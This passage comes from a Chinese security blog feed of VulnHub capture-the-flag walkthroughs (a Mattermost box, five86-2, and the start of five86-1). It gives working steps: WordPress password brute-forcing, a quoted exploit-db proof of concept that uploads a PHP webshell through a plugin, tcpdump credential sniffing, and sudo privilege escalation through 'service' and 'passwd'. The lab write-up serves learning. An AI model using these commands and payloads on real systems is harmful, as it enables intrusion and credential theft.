plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin：ComplexPassword0!</span><br></pre></td></tr></table></figure><p>随后我登陆到了它到后台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.138:8065/login</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1042.png" alt="图片"></p><p>来到后台后我大致看了看它的后台消息，翻译过来好像是一些没用的诗句？</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1043.png" alt="图片"></p><p>额。。。先不管它！我又去了 <code>exploit-db</code> 上寻找了有关 <code>Mattermost</code> 的漏洞，但是没有得到我想要的信息：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1044.png" alt="图片"></p><h2 id="Mattermost-后台获取FTP账号密码"><a href="#Mattermost-后台获取FTP账号密码" class="headerlink" title="Mattermost-后台获取FTP账号密码"></a>Mattermost-后台获取FTP账号密码</h2><p>随后我在后台的头像以及能上传的地方尝试看看能不能获取到一枚 <code>webshell</code>，很显然我没成功，我太菜了。</p><p>正当我一筹莫展的时候我发现了一个系统控制台找到了一个插件 <code>zoom</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1045.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1046.png" alt="图片"></p><p>它默认是 <code>False</code> 关闭的，我把它开启 <code>True</code> 后得到了一枚 <code>URL</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/JK94vsNKAns6HBkG/AxRt6LwuA7A6N4gk/index.html</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1047.png" alt="图片"></p><p>这个时候我是在 <code>8065</code> 端口打开的 <code>URL</code> 发现没有这个页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1048.png" alt="图片"></p><p>但是用 <code>80</code> 端口的 <code>web</code> 去访问这个页面的时候却得到一段提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.138/JK94vsNKAns6HBkG/AxRt6LwuA7A6N4gk/index.html</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1049.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello Admin, FTP credentials help you edit, transfer and delete files from your site. This is why it&#x27;s important to keep these credentials handy. FTP Credentials: ftpuser / ftppassword Make sure to keep these to yourself. </span><br></pre></td></tr></table></figure><p>通过这个提示我有得到一枚账号和密码，是 <code>FTP</code> 的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftpuser：ftppassword</span><br></pre></td></tr></table></figure><p>随后我便用得到的账号和密码成功登陆到它的 <code>FTP</code> 服务里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.1.148</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1050.png" alt="图片"></p><h2 id="获取到SSH的账号密码"><a href="#获取到SSH的账号密码" class="headerlink" title="获取到SSH的账号密码"></a>获取到SSH的账号密码</h2><p>登陆进去后发现有一个 <code>examples.desktop</code> 文件，还有一个 <code>users</code> 目录、<code>mattermost</code> 目录下有一个 <code>message</code> 文件，我把他们都下载到本地后查看了一下<code>examples.desktop</code> 文件没发现什么：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1051.png" alt="图片"></p><p>查看 <code>message</code> 文件发现里面有一段话：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1052.png" alt="图片"></p><p>这个时候有点懵了，整半天你给我了一句 <code>Welcome！！！</code> ？但是后来把一切结合起来想了想，刚开始是有一个 <code>users</code> 目录，然后是 <code>mattermost</code> 目录下有一个 <code>message</code> 文件，文件内容是 <code>Welcome!!!</code>。</p><p>柯南：<code>真実はいつも一つ</code>（真相只有一个），<code>mattermost</code> 是一个用户名，而 <code>message</code> 文件内容 <code>Welcome!!!</code> 就是密码！！！按照我这个推理我尝试登陆到它到 <code>SSH</code> 没想到真成了！！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">USER：mattermost</span><br><span class="line">PASS：Welcome!!!</span><br><span class="line">ssh mattermost@192.168.1.138</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1053.png" alt="图片"></p><p>玩 <code>CTF</code> 靶机就是要多思考，根据我们得到到信息要去想它为什么会有这个信息？这个信息的线索是干嘛的？我可以用得到的信息做写什么？</p><p>毕竟<code>CTF</code> 就是这样不按常理出牌，你得像个黑客，以黑客的思维去思考问题！</p><p>登陆到 <code>mattermost</code> 用户后，我习惯性的 <code>sudo -l</code> 发现它没有权限去执行 <code>sudo</code>，需要密码：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1054.png" alt="图片"></p><p>接着我查看了一下有没有一些文件可以以 <code>SUID</code> 权限去执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1055.png" alt="图片"></p><p>结果发现了刚好有一个文件 <code>secret</code> 文件是可以以 <code>SUID</code> 权限执行的，而且刚好在我所登陆的 <code>mattermost</code> 用户的 家目录下的桌面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/mattermost/Desktop/secret</span><br></pre></td></tr></table></figure><h2 id="逆向分析secret文件获取Flag"><a href="#逆向分析secret文件获取Flag" class="headerlink" title="逆向分析secret文件获取Flag"></a>逆向分析secret文件获取Flag</h2><p>随后我来到了 <code>mattermost</code> 用户的家目录，里面有一些目录和文件，除了 <code>Desktop</code> 目录里有文件，其他目录都是空的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1056.png" alt="图片"></p><p>我先是看了看 <code>README.md</code> 文件，发现里面是一段话，大概意思是你有一个密钥，而且在 <code>30</code> 天后会过期</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hello User,</span><br><span class="line"></span><br><span class="line">Your secret key is 48912.</span><br><span class="line"></span><br><span class="line">Do not share this key with anyone.</span><br><span class="line"></span><br><span class="line">!! NOTE:: This key is not valid after 30 days and has been changed by our internal systems.</span><br><span class="line">!! NOTE:: Please contact the support desk to get new secret key.</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1057.png" alt="图片"></p><p>吓的我迫不及待地去运行 <code>secret</code> 文件，运行后它让你输入密码，我用刚刚得到的密码发现出错了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1058.png" alt="图片"></p><p>很显然密码以及过期了！这个时候怎么办呢？我先是把 <code>secret</code> 文件使用 <code>nc</code> 传到 <code>KALI</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1059.png" alt="图片"></p><p>之后各种百度各种Google关于逆向的文章，临时拜佛脚！ WEB狗表示伤不起，一路硬钢下来的！呜呜呜～～～</p><p>经过查看源代码发现了一段代码：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1060.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  int local_14;</span><br><span class="line">  long local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(long *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  local_14 = 0;</span><br><span class="line">  puts(&quot;Hello Admin, Please enter the secret key:&quot;);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00100992,&amp;local_14);</span><br><span class="line">  if (local_14 == 0xf447) &#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    printf(&quot;Your is either invalid or expired\n.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not return */</span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到源代码之后开始审计，幸好以前学过一点点 <code>C</code> 语言，还是能看懂一点的，具体是要让 <code>local_14</code> 的值等于 <code>0xf447</code> ，这个时候就成功运行 <code>system</code> 函数，切换到 <code>/bin/bash</code> ！<code>0xf447</code> 是<code>十六进制</code>，我把它转化为<code>十进制</code>为：<code>62535</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1061.png" alt="图片"></p><p>最后运行 <code>secret</code> 文件获得 <code>root</code> 权限！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1062.png" alt="图片"></p><p>最终也是在 <code>/root/Desktop</code> 下拿到 <code>Flag</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-five86-2-Walkthrough</title>
      <link href="/2020/02/14/Vulnhub-five86-2/"/>
      <url>/2020/02/14/Vulnhub-five86-2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1365914380&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1006.png" alt="图片"></p><p>靶机地址：<a href="https://www.vulnhub.com/entry/five86-2,418/">https://www.vulnhub.com/entry/five86-2,418/</a><br>Name：five86_2<br>靶机介绍：<br>Five86-2 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.<br>The ultimate goal of this challenge is to get root and to read the one and only flag.<br>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.<br>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机 <code>IP</code> 地址先对它进行端口探测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.0.12</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1007.png" alt="图片"></p><p><code>NMAP</code> 扫描出来结果发现靶机只开放了 <code>80</code> 端口，并且使用的 <code>web</code> 是 <code>Wordpress</code> ！</p><p>我们先打开网站看看把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.12</span><br></pre></td></tr></table></figure><p>这个靶机和我之前玩的 <code>WTF：1</code> 有点类似，打开很卡很卡，加载半天才加载完。而且加载出来的页面是不完整的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1008.png" alt="图片"></p><p>这种情况先使用 <code>Burp</code> 抓包看看响应包里有没有关键的链接：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1009.png" alt="图片"></p><p>从上图可以看到它的响应包在请求这个 URL ：<code>http://five86-2/wp-includes/css/dist/block-library/style.min.css?ver=5.1.4</code> ，这个时候我们就可以设置 <code>hosts</code> 文件，把 <code>IP</code> 设置为 <code>five86-2</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">192.168.0.12five86-2</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1010.png" alt="图片"></p><p>修改完 <code>hosts</code> 后我们再来打开网页就一切正常了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1011.png" alt="图片"></p><h2 id="wpscan枚举账号密码"><a href="#wpscan枚举账号密码" class="headerlink" title="wpscan枚举账号密码"></a>wpscan枚举账号密码</h2><p>很显然它的 <code>CMS</code> 是 <code>Wordpress</code> 搭建的，我们先上神器 <code>wpscan</code> 来对它进行扫描把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.0.12/ -e u</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1012.png" alt="图片"></p><p>我这边是爆破出它网站的用户有这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">barney</span><br><span class="line">gillian</span><br><span class="line">peter</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure><p>接下来就是对它网站用户进行枚举，看看能不能爆破几个密码出来，我先是把刚刚扫描出来的用户保存到 <code>user.txt</code> 里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1013.png" alt="图片"></p><p>然后使用 <code>wpscan</code> 对它们进行爆破枚举（前方预警）：</p><p>我线程设置的是 <code>35</code> ，爆破了好长时间！！！呜呜呜～～～</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.0.12 -U user.txt -P /usr/share/wordlists/rockyou.txt -t 35</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1014.png" alt="图片"></p><p>成功枚举出来了两个用户密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">barney：spooky1</span><br><span class="line">stephen: apollo1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1015.png" alt="图片"></p><h2 id="Wordpress后台插件RCE-Getshell"><a href="#Wordpress后台插件RCE-Getshell" class="headerlink" title="Wordpress后台插件RCE Getshell"></a>Wordpress后台插件RCE Getshell</h2><p>用刚刚枚举出来的用户登陆到网站后台管理，来到插件这里看到一个插件引起了我的注意，接着我去 <code>exploit-db</code> 搜索了一下有关这个插件的漏洞，发现了一个 <code>RCE</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1016.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Authenticated code execution in `insert-or-embed-articulate-content-into-wordpress` Wordpress plugin</span><br><span class="line"># Description: It is possible to upload and execute a PHP file using the plugin option to upload a zip archive </span><br><span class="line"># Date: june 2019</span><br><span class="line"># Exploit Author: xulchibalraa</span><br><span class="line"># Vendor Homepage: https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/</span><br><span class="line"># Software Link: https://downloads.wordpress.org/plugin/insert-or-embed-articulate-content-into-wordpress.4.2995.zip</span><br><span class="line"># Version: 4.2995 &lt;= 4.2997 </span><br><span class="line"># Tested on: Wordpress 5.1.1, PHP 5.6 </span><br><span class="line"># CVE : -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 1. Create a .zip archive with 2 files: index.html, index.php</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;html&gt;hello&lt;/html&gt;&quot; &gt; index.html</span><br><span class="line">echo &quot;&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; index.php</span><br><span class="line">zip poc.zip index.html index.php </span><br><span class="line"></span><br><span class="line">## 2. Log in to wp-admin with any user role that has access to the plugin functionality (by default even `Contributors` role have access to it)</span><br><span class="line">## 3. Create a new Post -&gt; Select `Add block` -&gt; E-Learning -&gt; Upload the poc.zip -&gt; Insert as: Iframe -&gt; Insert (just like in tutorial https://youtu.be/knst26fEGCw?t=44 ;)</span><br><span class="line">## 4. Access the webshell from the URL displayed after upload similar to </span><br><span class="line"></span><br><span class="line">http://website.com/wp-adm</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1017.png" alt="图片"></p><p>设置好一个上传我们的 <code>zip</code> 文件到网站的文章页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1018.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1019.png" alt="图片"></p><p>上传完之后 <code>nc</code> 监听 <code>4444</code> 端口 ，访问 <code>index.php</code> 得到一枚 <code>shell</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">five86-2/wp-content/uploads/articulate_uploads/saul/index.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1020.png" alt="图片"></p><p>之后返回的 <code>shell</code> 不是 <code>bash</code> ，而且还不能清屏，我设置了一下shell和环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=screen</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1021.png" alt="图片"></p><p>这个时候就是一个 <code>bash</code> 的shell了，而且还可以清屏！</p><p>随后我切换到 <code>/home</code> 目录下，发现有很多用户，其中有两个用户是我们之前 <code>wpscan</code> 爆破出来的，我尝试 <code>su</code> 切换到 <code>stephen</code> 用户成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">apollo1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1022.png" alt="图片"></p><p>接下来就是权限提升的过程了！我先是看了看定时任务，没得！然后 <code>sudo -l</code> 发现需要密码！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1023.png" alt="图片"></p><p>随后我看了看该用户可写的文件，无果！（多出来的文件是我之前玩靶机留下的，所以说没有文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type f 2&gt;/dev/null &gt;/tmp/file.txt</span><br><span class="line">grep -Ev &#x27;/proc|/sys&#x27; /tmp/file.txt </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1024.png" alt="图片"></p><h2 id="tcpdump拦截网卡流量获取FTP账号密码"><a href="#tcpdump拦截网卡流量获取FTP账号密码" class="headerlink" title="tcpdump拦截网卡流量获取FTP账号密码"></a>tcpdump拦截网卡流量获取FTP账号密码</h2><p>接着我切换到<code>stephen</code>的家目录，然后查看了系统中所有可以用 <code>tcpdump</code> 拦截的网络接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">关于getcap可以看看这些文章：</span><br><span class="line">http://rk700.github.io/2016/10/26/linux-capabilities/</span><br><span class="line">https://juejin.im/post/5dc1159d5188255f763b8db9</span><br><span class="line">https://www.cnblogs.com/sparkdev/p/11417781.html</span><br><span class="line"></span><br><span class="line">tcpdump -D</span><br><span class="line">注释：-D 打印出系统中所有可以用tcpdump截包的网络接口。</span><br><span class="line">关于tcpdump的用法可以看这篇文章：http://www.ha97.com/4550.html</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1026.png" alt="图片"></p><p>随后我便使用 <code>tcpdump</code> 来检查 <code>veth68d2569</code> 这个网络流量，并保存为 <code>hack.pcap</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">timeout 120 tcpdump -w hack.pcap -i veth68d2569</span><br><span class="line">注释：</span><br><span class="line">timeout 120，是用来控制 tcpdump 的超时时间为 120s</span><br><span class="line">tcpdump -w 保存为 saul.pcap，-i 的意思是指定监听的网络接口</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1027.png" alt="图片"></p><p>最后读取刚刚获取的数据包发现一个 <code>FTP</code> 账号密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r hack.pcap</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1028.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User：paul</span><br><span class="line">Pass：esomepasswford</span><br></pre></td></tr></table></figure><p>拿到账号和密码尝试切换到 <code>paul</code> 用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1029.png" alt="图片"></p><h2 id="sudo权限提升"><a href="#sudo权限提升" class="headerlink" title="sudo权限提升"></a>sudo权限提升</h2><p>切换成功后习惯性的 <code>sudo -l</code> 发现 <code>paul</code> 用户 可以以 <code>peter</code> 身份去运行 <code>/usr/sbin/service</code> ！：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1030.png" alt="图片"></p><p>接着我使用 <code>sudo</code> 来以 <code>peter</code> 用户去运行 <code>/usr/sbin/service</code> ，并切换到 <code>/bin/bash</code> ，这个时候就成功切换到 <code>peter</code> 用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u peter /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1031.png" alt="图片"></p><p>切换到 <code>peter</code> 用户后又是习惯性的 <code>sudo -l</code> 发现 <code>peter</code> 用户可以以 <code>root</code> 身份去 执行 <code>/usr/bin/passwd</code> !</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1032.png" alt="图片"></p><p>最后我以 <code>peter</code> 用户的身份去重置了 <code>root</code> 用户的密码，最终也是在 <code>/root</code> 目录下拿到 <code>Flag</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root passwd root</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1033.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-five86-1-Walkthrough</title>
      <link href="/2020/02/12/Vulnhub-five86-1/"/>
      <url>/2020/02/12/Vulnhub-five86-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29418950&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>靶机地址：<a href="https://www.vulnhub.com/entry/five86-1,417/">https://www.vulnhub.com/entry/five86-1,417/</a><br>Name： five86: 1<br>靶机介绍：<br>Five86-1 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.<br>The ultimate goal of this challenge is to get root and to read the one and only flag.<br>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.<br>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机 <code>IP</code> 后对它进行端口扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.134</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/984.png" alt="图片"></p><p>靶机开放了 <code>22</code>、<code>80</code>、<code>10000</code> 三个端口。我们先看看 <code>web</code> 页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.134/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/985.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/986.png" alt="图片"></p><p><code>web</code> 页面是空白的！那么我们对它目录进行扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.134</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/987.png" alt="图片"></p><p>发现有这些目录文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.1.134/ ----</span><br><span class="line">+ http://192.168.1.134/index.html (CODE:200|SIZE:30)                                                                                                                                                        </span><br><span class="line">+ http://192.168.1.134/reports (CODE:401|SIZE:460)                                                                                                                                                          </span><br><span class="line">+ http://192.168.1.134/robots.txt 